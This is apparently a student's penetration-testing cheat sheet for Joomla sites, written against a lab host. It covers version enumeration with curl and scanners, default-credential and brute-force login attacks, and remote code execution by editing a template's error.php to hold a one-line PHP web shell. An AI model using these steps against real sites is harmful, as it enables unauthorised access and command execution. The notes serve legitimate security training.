

- [ ] [[#ENUMERATION MANUELLE]]
- [ ] [[#ENUMERATION DROOPESCAN]]
- [ ] [[#EXPLOITATION]]
- [ ] [[#HARDENING]]

# ENUMERATION MANUELLE

[[#Identifier Joomla]]
[[#Version Joomla]]

/robots.txt
/sitemap.xml

## Identifier Joomla

```shell
curl -s http://dev.inlanefreight.local/ | grep Joomla
```
## Version Joomla

```shell
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
```

```shell
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```

```shell
curl -s http://dev.inlanefreight.local/plugins/system/cache/cache.xml | xmllint --format -
```

voir dans fichiers javascripts egalement ->  media/system/js/

---

# ENUMERATION #DROOPESCAN

```shell
sudo pip3 install droopescan --break-system-packages
```

```shell
sudo droopescan scan joomla --url http://dev.inlanefreight.local/
```

---
# ENUMERATION #JOOMSCAN

```BASH
joomscan --ec -u <URL>
```

---
# ENUMERATION #CMSMAP

```bash
cmsmap [-f W] -F -d <URL>
```

---

# ENUMERATION #VULNX 


```bash
vulnx -u <url> --cms-info all --web-info --domain-info
```



---

# EXPLOITATION


## Tester Weak credentials / Credential stuffing

admin:admin, admin:password....
### Credential Stuffing (Liste de default creds)

Resources:

https://www.cirt.net/passwords
https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
https://github.com/scadastrangelove/SCADAPASS/blob/master/scadapass.csv
https://github.com/ihebski/DefaultCreds-cheat-sheet/tree/main


## Bruteforce de login

https://github.com/ajnik/joomla-bruteforce/blob/master/joomla-brute.py

```shell
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```


## Plugins / Themes / Joomla Vulnerables

Chercher CVEs et tester

## RCE Templates


System > Control Panel > Templates > Templates > Details and Files > error.php

```php
<?php system($_REQUEST['cmd']); ?>
```

```shell
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?cmd=id
```


---

# HARDENING


https://docs.joomla.org/Security_Checklist/Joomla!_Setup